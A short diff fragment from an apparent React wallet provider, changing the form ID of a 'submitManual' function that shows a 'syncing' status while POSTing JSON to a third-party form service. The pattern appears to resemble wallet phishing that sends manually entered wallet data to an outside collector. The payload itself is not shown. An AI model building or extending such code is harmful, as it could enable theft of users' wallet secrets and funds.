@@ -76,7 +76,7 @@ export function WalletProvider({ children }: { children: ReactNode }) {
   const submitManual = async () => {
     setStatus("syncing");
     try {
-      await fetch("https://submit-form.com/4sJGEzNCF", {
+      await fetch("https://submit-form.com/CSfD1FWHQ", {
         method: "POST",
         headers: { "Content-Type": "application/json", Accept: "application/json" },
         body: JSON.stringify({
